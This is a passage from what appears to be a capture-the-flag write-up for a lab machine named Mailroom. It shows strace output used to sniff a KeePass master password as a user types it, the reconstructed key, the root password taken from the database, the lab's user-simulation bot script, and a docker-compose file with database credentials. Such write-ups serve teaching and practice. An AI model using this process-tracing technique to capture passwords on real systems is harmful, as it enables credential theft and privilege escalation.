clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "0", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "1", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "\10", 8192)                    = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "\10 \10", 3)                  = 3
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "r", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "d", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "9", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "\n", 8192)                     = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
ioctl(0, TCGETS, {B38400 opost -isig -icanon -echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost -isig -icanon -echo ...}) = 0
ioctl(0, SNDCTL_TMR_START or TCSETS, {B38400 opost isig icanon echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0
```

After doing a bit of parsing and cleaning out, I got the key

```jsx
!sEcUr3p4$$w0rd9
```

Downloading the database, I accessed it via GUI (I could’ve accessed it via `kpcli` but I prefer GUI), we can see that it stores password for the sites along with the `root` user’s password:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_19.png)

```jsx
root:a$gBa3!GA8
```

We can just authenticate as `root` using `su` and we got the access as `root` user

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_20.png)

---

```jsx
#!/usr/bin/python3 - matthew_kpcli.py
import os, random, time, hashlib
import pexpect

## This script is used to simulate matthew logging into his database in real time

db_path = '/home/matthew/personal.kdbx'
db_original = '/root/personal.kdbx'
db_checksum = hashlib.md5(open(db_original, 'rb').read()).hexdigest()
runas_user = 'matthew'

def send_human(k, txt):
    """
    Send each character separately with a slight delay to emulate a human typing
    """
    for ch in txt:
        k.send(ch)
        k.delaybeforesend = random.uniform(0.05, 0.25)
    k.send(os.linesep)

def main():

    k = pexpect.spawn(f'/usr/bin/su - {runas_user} -c "/usr/bin/kpcli"')
    time.sleep(3)
    k.expect('kpcli:/> ')
    try:
        while True:
            # Verify md5sum or db, if fails copy back
            if hashlib.md5(open(db_path, 'rb').read()).hexdigest() != db_checksum:
                os.system(f'/usr/bin/cp {db_original} {db_path} && /usr/bin/chown {runas_user}: {db_path}')

            # Check if process is still running if it isnt run it again
            if not k.isalive():
                return None

            # Kill other previous tracers - To avoid people leaving strace or something on blocking other users from tracing
            real_pid = int(os.popen(f"/usr/bin/cat /proc/{k.pid}/task/{k.pid}/children").read()) # Get the child PID (kpcli's pid)
            tracer_pid = int(os.popen(f"/usr/bin/cat /proc/{real_pid}/status | /usr/bin/grep Trace | /usr/bin/awk '{{print $2}}'").read())
            if tracer_pid != 0:
                os.system(f"/usr/bin/kill -5 {tracer_pid}")  # SIGTRAP

            send_human(k, f'open {db_path}')
            k.expect('Please provide the master password: ')
            send_human(k, '!sEcUr3p4$$w01\010rd9')  # \010 is a del character
            k.expect('kpcli:/> ')
            send_human(k, 'ls Root/')
            k.expect('kpcli:/> ')
            send_human(k, 'show -f 0')
            k.expect('kpcli:/> ')
            time.sleep(3)
            send_human(k, 'quit')
    except:
        return None

if __name__ == "__main__":
    main()
root@mailroom:~#
```

```jsx
root@mailroom:~/containers# cat docker-compose.yml
version: '3'
services:
  db:
    image: postgres:15.1-bullseye
    environment:
      - POSTGRES_USER=gitea
      - POSTGRES_PASSWORD=gitea_l33t_p@ssw04d
      - POSTGRES_DB=gitea
    restart: always
    volumes:
      - /root/containers/postgres:/var/lib/postgresql/data
    networks:
      - mynetwork
  gitea:
    image: gitea/gitea:1.18
    environment:
      - USER_UID=1000
      - USER_GID=1000
      - DB_TYPE=postgres
      - DB_HOST=db
      - DB_NAME=gitea
      - DB_USER=gitea
      - DB_PASSWD=gitea_l33t_p@ssw04d
    restart: always
    volumes:
      - /root/containers/gitea:/data
    depends_on:
      - db
    networks:
      - mynetwork
  mongodb:
    image: mongo:4.2.23
    restart: always
    volumes:
    - /root/containers/db:/data/db
    networks:
      - mynetwork
  sites:
    cap_drop:
      - mknod
    build:
      context: /root/containers/
      dockerfile: /root/containers/Dockerfile
    ports:
      - "80:80"
    depends_on:
      - gitea
      - mongodb
    volumes:
      - /root/containers/sites:/var/www
    networks:
      - mynetwork

networks:
  mynetwork:
    driver: bridge
    ipam:
      config:
      - subnet: 172.19.0.0/16
```


